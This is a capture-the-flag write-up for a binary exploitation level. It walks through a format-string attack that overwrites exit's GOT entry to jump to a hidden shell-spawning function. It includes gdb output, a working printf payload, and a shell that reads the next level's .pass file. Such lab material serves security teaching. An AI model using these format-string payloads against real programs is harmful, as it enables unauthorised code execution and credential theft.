In this level, `main` calls `n()` in which there is a `printf` function we want to use to reach an hidden function `o()` to open a shell. The thing is that `printf` is followed by an `exit` function that seems to be at the address `0x80483d0`.

```
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
```

```
(gdb) disass 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6
```

`0x8049838` is the address of `exit` in the Global Offset Table, we have to change for the address of `o()` which is `0x080484a4`.

A way to check if our theory's good: 
In gdb, set breakpoints at `printf` and `exit` addresses and manualy set the value. 

```
Breakpoint 1, 0x080484f3 in n ()
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080483d6
(gdb) set {int}0x8049838=0x80484a4
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:	0x080484a4
```

We calculate the number of bytes we want to overwrite it with: 134513828 - 4 = `134513824`

```
python -c 'print int("80484a4", 16)'
134513828
```

We calculate the offset, same way thant level3, level4, and it's equal to `4`.

```
(gdb) r <<< $(python -c "print 'A' * 20 + '%x ' * 20")
```

So we can write in a terminal :

```
(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' && cat) | ./level5

...

whoami
level6
cat /home/user/level6/.pass
```